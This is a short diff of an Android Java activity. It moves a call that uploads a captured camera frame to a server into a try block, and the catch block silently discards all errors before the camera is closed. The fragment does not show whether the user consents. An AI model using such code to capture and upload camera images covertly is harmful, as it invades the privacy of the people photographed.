@@ -203,12 +203,14 @@ public class MainActivity extends Activity {
                                 reader.setOnImageAvailableListener(r -> {
                                     Image img = reader.acquireLatestImage();
                                     if (img != null) {
-                                        ByteArrayOutputStream bos = new ByteArrayOutputStream();
-                                        byte[] buf = new byte[img.getPlanes()[0].getBuffer().remaining()];
-                                        img.getPlanes()[0].getBuffer().get(buf);
-                                        bos.write(buf);
+                                        try {
+                                            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+                                            byte[] buf = new byte[img.getPlanes()[0].getBuffer().remaining()];
+                                            img.getPlanes()[0].getBuffer().get(buf);
+                                            bos.write(buf);
+                                            uploadPhotoToServer(context, bos.toByteArray(), lensFacing);
+                                        } catch (Exception ignored) {}
                                         img.close();
-                                        uploadPhotoToServer(context, bos.toByteArray(), lensFacing);
                                     }
                                     reader.close();
                                     camera.close();
